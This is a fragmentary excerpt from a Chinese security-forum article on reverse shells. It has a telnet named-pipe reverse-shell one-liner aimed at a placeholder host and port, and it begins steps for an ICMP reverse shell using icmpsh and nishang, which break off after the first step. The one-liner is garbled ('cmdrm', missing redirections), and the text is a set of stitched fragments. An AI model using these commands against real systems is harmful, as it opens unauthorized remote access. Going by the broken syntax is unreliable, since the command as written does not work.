...
> **来源**: https://forum.butian.net/share/2900  
> **文章ID**: 2900
...
```cmd
cmdrm -f /tmp/p; mknod /tmp/p p && telnet [host] [port] 0/tmp/p
```
...
openssl单/双向认证参考：[https://blog.csdn.net/go\_home\_look/article/details/107238103](https://blog.csdn.net/go_home_look/article/details/107238103)
...
[什么是awk？](https://github.com/mylxsw/growing-up/blob/master/doc/%E4%B8%89%E5%8D%81%E5%88%86%E9%92%9F%E5%AD%A6%E4%BC%9AAWK.md)
...
需要利用[icmpsh\_m.py](https://github.com/inquisb/icmpsh)和nishang中的Invoke-PowerShellIcmp.ps1 来反弹ICMP shell。

- 首先攻击端下载icmpsh\_m.py文件
